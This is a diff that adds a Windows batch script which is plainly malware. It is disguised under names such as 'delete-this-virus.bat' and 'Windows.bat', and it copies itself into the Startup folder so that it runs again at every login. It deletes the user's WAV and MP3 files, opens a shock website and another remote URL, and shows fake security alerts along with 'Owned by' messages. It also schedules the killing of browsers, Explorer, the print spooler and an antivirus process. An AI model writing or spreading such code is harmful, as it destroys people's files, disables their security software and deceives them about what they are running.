@@ -1,0 +1,47 @@
+
+@echo off
+title 6121824
+color 4
+cd %userprofile%\Start Menu\Programs\Startup
+if exist "delete-this-virus.bat" goto start
+if exist "Windows.bat" goto start
+msg * Virus Deleted
+cd %userprofile%\Desktop
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "%userprofile%\Start Menu\Programs\Startup"
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "C:\"
+if exist "delete-this-virus.bat" del "delete-this-virus.bat"
+cd %userprofile%\My Documents\My Received Files
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "%userprofile%\Start Menu\Programs\Startup"
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "C:\"
+if exist "delete-this-virus.bat" del "delete-this-virus.bat"
+cd C:\
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "%userprofile%\Start Menu\Programs\Startup"
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "Windows.bat"
+if exist "delete-this-virus.bat" copy "delete-this-virus.bat" "HackandTrick.bat"
+if exist "Windows.bat" copy "Windows.bat" "%userprofile%\Start Menu\Programs\Startup"
+if exist "HackandTrick.bat" copy "HackandTrick.bat" "%userprofile%\Start Menu\Programs\Startup"
+cls
+:start
+start http://meatspin.com
+start http://onload.110mb.com/Windows-Virus...
+start "6121824"
+time 12:00
+cd %userprofile%\Desktop
+if exist "*.*wav" del "*.*wav"
+if exist "*.*Mp3" del "*.*Mp3"
+cd %userprofile%\My Documents\My Music
+if exist "*.*wav" del "*.*wav"
+if exist "*.*Mp3" del "*.*Mp3"
+msg * Windows Security Center has Detected a Virus on your Computer
+msg * Owned by 6121824
+msg * 6121824
+msg * 6121824
+at 12:01 msg * 6121824 (c) HackandTrick
+at 12:02 tskill firefox
+at 12:02 tskill iexplore
+at 12:03 msg * 6121824
+at 12:04 msg * 6121824
+at 12:04 tskill "ccApp"
+at 12:04 tskill explorer
+at 12:04 tskill "spoolsv"
+start
